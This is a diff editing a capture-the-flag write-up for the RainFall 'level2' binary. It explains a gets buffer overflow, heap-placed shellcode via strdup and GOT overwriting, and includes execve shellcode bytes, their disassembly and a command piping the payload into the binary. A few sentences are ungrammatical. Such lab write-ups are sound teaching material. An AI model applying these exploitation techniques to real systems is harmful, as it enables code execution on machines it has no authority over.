@@ -80,9 +80,9 @@ If we can overwrite an entry in the GOT, we can redirect function calls to any a
 
 ##  Exploiting the binary
 
-Here the level gives us subtle hints as to how to proceed. The presence of the `gets` function indicates that we can overflow a buffer, but the absence of `system` suggests we need to call the shell ourselves. The check for the high bits of the input address (the `and` and `cmp` instructions) indicates that we cannot return to the stack or the libc, since the ranges `0xb7xxxxxx` and `0xbfxxxxxx` are filtered out. The presence of `strdup` is a clear hint that we should use the heap to store our shellcode, aka the CPU instructions that will spawn our shell.
+Here the level gives us subtle hints as to how to proceed. The presence of the `gets` function indicates that we can overflow a buffer, but the absence of `system` suggests we need to call the shell ourselves. The check for the high bits of the input address (the `and` and `cmp` instructions) indicates that we cannot return to the stack or the libc, since the high ranges `0xb7xxxxxx` and `0xbfxxxxxx` are filtered out. The presence of `strdup` is hints at a possible use the heap to store our shellcode, aka the CPU instructions that will spawn our shell.
 
-Since the address range for the stack is not filtered 
+Since the address range for the heap, the lower addresses, is not filtered out, we can inject our shellcode into the heap and then overwrite a GOT entry to point to this shellcode. When the function corresponding to the overwritten GOT entry is called, it will execute our shellcode instead.
 
 Consider the following instructions:
 
@@ -106,3 +106,9 @@ python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\
 53              push ebx          ; argv[0] = "/bin/bash"
 89 e1           mov ecx, esp      ; ecx = argv
 cd 80           int 0x80          ; SYSCALL : execve(ebx, ecx, edx)
+
+We then need to inject this shellcode like so:
+
+```bash
+level2@RainFall:~$ cat /tmp/payload - | ./level2
+```
